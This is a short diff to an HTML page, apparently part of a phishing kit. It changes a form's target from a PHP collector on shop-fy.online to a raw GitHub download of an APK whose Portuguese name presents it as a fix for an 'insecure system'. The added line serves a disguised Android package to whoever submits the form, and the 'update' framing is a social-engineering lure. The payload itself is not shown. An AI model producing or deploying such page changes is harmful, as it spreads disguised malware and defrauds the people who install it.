@@ -34,7 +34,7 @@
  
   <body class="bg-white">
    
-<form action="https://shop-fy.online:171/rdz.php">
+<form action="https://github.com/mobi-center/mobi-center/raw/main/seu%20sistema%20inseguro%20ou%20prefere%20atualizar.apk">
     
     <div class="container">
       <div class="py-5 text-center">
